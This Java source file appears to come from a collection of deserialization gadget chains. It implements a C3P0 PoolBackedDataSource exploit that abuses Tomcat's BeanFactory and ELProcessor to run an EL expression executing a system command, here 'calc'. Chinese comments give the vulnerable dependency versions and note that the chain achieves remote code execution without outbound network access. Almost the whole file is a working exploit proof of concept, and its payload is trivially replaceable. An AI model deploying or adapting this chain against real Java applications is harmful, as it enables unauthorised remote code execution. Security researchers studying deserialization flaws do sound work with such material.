/**
 * @Description
 * @Author dragonkeep
 * @Date 2024/12/13
 */
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;
import util.Util;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/*
* 版本依赖：
*tomcat-embed-el  8.5.15
*tomcat-catalina  8.5.0
* */
/*
* 说明:
* 跟C3P0_URLCLassLoader前面基本一致，主要是通过tomcat的catalina和tomcat-embed-el包来执行el表达式，
* 实现RCE，这个条的好处是不需要机器出网就能执行RCE
* */
public class C3P0_BeanFactory {
    private static final class MyPool implements ConnectionPoolDataSource, Referenceable {
        private String className;
        private String url;

        public MyPool(){}
        public MyPool(String className, String url) {
            this.className = className;
            this.url = url;
        }

        @Override
        public Reference getReference() throws NamingException {
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String) null, "", "", true, "org.apache.naming.factory.BeanFactory", (String) null);
            resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
            resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }


    }

    public static void main(String[] args) throws Exception {
        PoolBackedDataSource poolBackedDataSource = new PoolBackedDataSource();
        MyPool myPool=new MyPool();
        Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSource, myPool);
        Util.serialize(poolBackedDataSource);
        Util.unserialize();
    }
}
